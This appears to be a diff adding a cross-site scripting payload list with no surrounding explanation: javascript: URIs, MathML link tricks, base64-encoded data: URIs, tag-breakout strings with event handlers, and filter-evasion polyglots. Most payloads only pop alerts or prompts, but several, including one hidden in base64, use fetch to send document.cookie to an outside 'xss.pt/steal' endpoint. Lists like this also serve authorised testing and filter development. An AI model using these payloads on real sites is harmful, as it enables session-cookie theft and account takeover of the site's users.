+<math><maction actiontype=statusline xlink:href=javascript:globalThis['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:globalThis['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert`1`>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert``>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)//>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)/*>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)<!-->Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)--> >Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3);alert(4)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3);alert(4);alert(5)>Click</maction></math>
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert('XSS')
+javascript:alert("XSS")
+javascript:alert(/XSS/)
+javascript:alert(1);
+javascript:alert(1)//
+javascript:alert(1)/*
+javascript:alert(1)<!--
+javascript:alert(1)-->
+javascript:alert(1);alert(2)
+javascript:alert(1);alert(2);alert(3)
+javascript:alert(1);alert(2);alert(3);alert(4)
+javascript:alert(1);alert(2);alert(3);alert(4);alert(5)
+javascript:fetch('http://xss.pt/steal?c='+document.cookie)
+javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)
+javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)
+javascript:console.log(1)
+javascript:console.log(document.cookie)
+javascript:console.log('XSS')
+javascript:prompt(1)
+javascript:prompt(document.cookie)
+javascript:prompt('XSS')
+javascript:confirm(1)
+javascript:confirm(document.cookie)
+javascript:confirm('XSS')
+javascript:document.write(1)
+javascript:document.write(document.cookie)
+javascript:document.write('XSS')
+javascript:eval('alert(1)')
+javascript:eval('alert(document.cookie)')
+javascript:eval('alert(\"XSS\")')
+javascript:setTimeout('alert(1)',0)
+javascript:setTimeout('alert(document.cookie)',0)
+javascript:setTimeout('alert(\"XSS\")',0)
+javascript:setInterval('alert(1)',0)
+javascript:setInterval('alert(document.cookie)',0)
+javascript:setInterval('alert(\"XSS\")',0)
+javascript:Function('alert(1)')()
+javascript:Function('alert(document.cookie)')()
+javascript:Function('alert(\"XSS\")')()
+javascript:(alert)(1)
+javascript:(alert)(document.cookie)
+javascript:(alert)('XSS')
+javascript:alert.call(null,1)
+javascript:alert.call(null,document.cookie)
+javascript:alert.call(null,'XSS')
+javascript:alert.apply(null,[1])
+javascript:alert.apply(null,[document.cookie])
+javascript:alert.apply(null,['XSS'])
+javascript:window['alert'](1)
+javascript:window['alert'](document.cookie)
+javascript:window['alert']('XSS')
+javascript:self['alert'](1)
+javascript:self['alert'](document.cookie)
+javascript:self['alert']('XSS')
+javascript:top['alert'](1)
+javascript:top['alert'](document.cookie)
+javascript:top['alert']('XSS')
+javascript:parent['alert'](1)
+javascript:parent['alert'](document.cookie)
+javascript:parent['alert']('XSS')
+javascript:opener['alert'](1)
+javascript:opener['alert'](document.cookie)
+javascript:opener['alert']('XSS')
+javascript:frames['alert'](1)
+javascript:frames['alert'](document.cookie)
+javascript:frames['alert']('XSS')
+javascript:globalThis['alert'](1)
+javascript:globalThis['alert'](document.cookie)
+javascript:globalThis['alert']('XSS')
+javascript:alert`1`
+javascript:alert``
+javascript:alert(1)
+javascript:alert(1);
+javascript:alert(1)//
+javascript:alert(1)/*
+javascript:alert(1)<!--
+javascript:alert(1)-->
+javascript:alert(1);alert(2)
+javascript:alert(1);alert(2);alert(3)
+javascript:alert(1);alert(2);alert(3);alert(4)
+javascript:alert(1);alert(2);alert(3);alert(4);alert(5)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovL3hzcy5wdC9zdGVhbD9jPScrZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgxKScpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5zZXRUaW1lb3V0KCdhbGVydCgxKScsMCk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5zZXRJbnRlcnZhbCgnYWxlcnQoMSknLDApPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5GdW5jdGlvbignYWxlcnQoMSknKSgpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD4oYWxlcnQpKDEpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5hbGVydC5jYWxsKG51bGwsMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydC5hcHBseShudWxsLFsxXSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD53aW5kb3dbJ2FsZXJ0J10oMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5zZWxmWydhbGVydCddKDEpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD50b3BbJ2FsZXJ0J10oMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5wYXJlbnRbJ2FsZXJ0J10oMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5vcGVuZXJbJ2FsZXJ0J10oMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5mcmFtZXNbJ2FsZXJ0J10oMSk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5nbG9iYWxUaGlzWydhbGVydCddKDEpPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5hbGVydGAxYDwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
+'"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+'"><svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+'"><script>alert(1)</script>
+"><script>alert(1)</script>
+'"><body onload=alert(1)>
+"><body onload=alert(1)>
+'"><marquee/onstart=alert(1)>
+"><marquee/onstart=alert(1)>
+'"><details/open/ontoggle=alert(1)>
+"><details/open/ontoggle=alert(1)>
+'"><input onfocus=alert(1) autofocus>
+"><input onfocus=alert(1) autofocus>
+'"><iframe src="javascript:alert(1)">
+"><iframe src="javascript:alert(1)">
+'"><a href="javascript:alert(1)">Click</a>
+"><a href="javascript:alert(1)">Click</a>
+'"><div onmouseover=alert(1)>Hover</div>
+"><div onmouseover=alert(1)>Hover</div>
+'"><img src=x onerror=alert(document.cookie)>
+"><img src=x onerror=alert(document.cookie)>
+'"><svg/onload=alert(document.cookie)>
+"><svg/onload=alert(document.cookie)>
+'"><script>alert(document.cookie)</script>
+"><script>alert(document.cookie)</script>
+'"><body onload=alert(document.cookie)>
+"><body onload=alert(document.cookie)>
+'"><marquee/onstart=alert(document.cookie)>
+"><marquee/onstart=alert(document.cookie)>
+'"><details/open/ontoggle=alert(document.cookie)>
+"><details/open/ontoggle=alert(document.cookie)>
+'"><input onfocus=alert(document.cookie) autofocus>
+"><input onfocus=alert(document.cookie) autofocus>
+'"><iframe src="javascript:alert(document.cookie)">
+"><iframe src="javascript:alert(document.cookie)">
+'"><a href="javascript:alert(document.cookie)">Click</a>
+"><a href="javascript:alert(document.cookie)">Click</a>
+'"><div onmouseover=alert(document.cookie)>Hover</div>
+"><div onmouseover=alert(document.cookie)>Hover</div>
+'"><img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie)>
+"><img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie)>
+'"><svg/onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+"><svg/onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+'"><script>fetch('http://xss.pt/steal?c='+document.cookie)</script>
+"><script>fetch('http://xss.pt/steal?c='+document.cookie)</script>
+'"><body onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+"><body onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+'"><marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie)>
+"><marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie)>
+'"><details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie)>
+"><details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie)>
+'"><input onfocus=fetch('http://xss.pt/steal?c='+document.cookie) autofocus>
+"><input onfocus=fetch('http://xss.pt/steal?c='+document.cookie) autofocus>
+'"><iframe src="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">
+"><iframe src="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">
+'"><a href="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">Click</a>
+"><a href="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">Click</a>
+'"><div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie)>Hover</div>
+"><div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie)>Hover</div>
+'"><img src=x onerror=prompt(1)>
+"><img src=x onerror=prompt(1)>
+'"><svg/onload=prompt(1)>
+"><svg/onload=prompt(1)>
+'"><script>prompt(1)</script>
+"><script>prompt(1)</script>
+'"><body onload=prompt(1)>
+"><body onload=prompt(1)>
+'"><marquee/onstart=prompt(1)>
+"><marquee/onstart=prompt(1)>
+'"><details/open/ontoggle=prompt(1)>
+"><details/open/ontoggle=prompt(1)>
+'"><input onfocus=prompt(1) autofocus>
+"><input onfocus=prompt(1) autofocus>
+'"><iframe src="javascript:prompt(1)">
+"><iframe src="javascript:prompt(1)">
+'"><a href="javascript:prompt(1)">Click</a>
+"><a href="javascript:prompt(1)">Click</a>
+'"><div onmouseover=prompt(1)>Hover</div>
+"><div onmouseover=prompt(1)>Hover</div>
+'"><img src=x onerror=confirm(1)>
+"><img src=x onerror=confirm(1)>
+'"><svg/onload=confirm(1)>
+"><svg/onload=confirm(1)>
+'"><script>confirm(1)</script>
+"><script>confirm(1)</script>
+'"><body onload=confirm(1)>
+"><body onload=confirm(1)>
+'"><marquee/onstart=confirm(1)>
+"><marquee/onstart=confirm(1)>
+'"><details/open/ontoggle=confirm(1)>
+"><details/open/ontoggle=confirm(1)>
+'"><input onfocus=confirm(1) autofocus>
+"><input onfocus=confirm(1) autofocus>
+'"><iframe src="javascript:confirm(1)">
+"><iframe src="javascript:confirm(1)">
+'"><a href="javascript:confirm(1)">Click</a>
+"><a href="javascript:confirm(1)">Click</a>
+'"><div onmouseover=confirm(1)>Hover</div>
+"><div onmouseover=confirm(1)>Hover</div>
+'"><img src=x onerror=console.log(1)>
+"><img src=x onerror=console.log(1)>
+'"><svg/onload=console.log(1)>
+"><svg/onload=console.log(1)>
+'"><script>console.log(1)</script>
+"><script>console.log(1)</script>
+'"><body onload=console.log(1)>
+"><body onload=console.log(1)>
+'"><marquee/onstart=console.log(1)>
+"><marquee/onstart=console.log(1)>
+'"><details/open/ontoggle=console.log(1)>
+"><details/open/ontoggle=console.log(1)>
+'"><input onfocus=console.log(1) autofocus>
+"><input onfocus=console.log(1) autofocus>
+'"><iframe src="javascript:console.log(1)">
+"><iframe src="javascript:console.log(1)">
+'"><a href="javascript:console.log(1)">Click</a>
+"><a href="javascript:console.log(1)">Click</a>
+'"><div onmouseover=console.log(1)>Hover</div>
+"><div onmouseover=console.log(1)>Hover</div>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=fetch('http://xss.pt/steal?c='+document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('http://xss.pt/steal?c='+document.cookie)//>\x3e
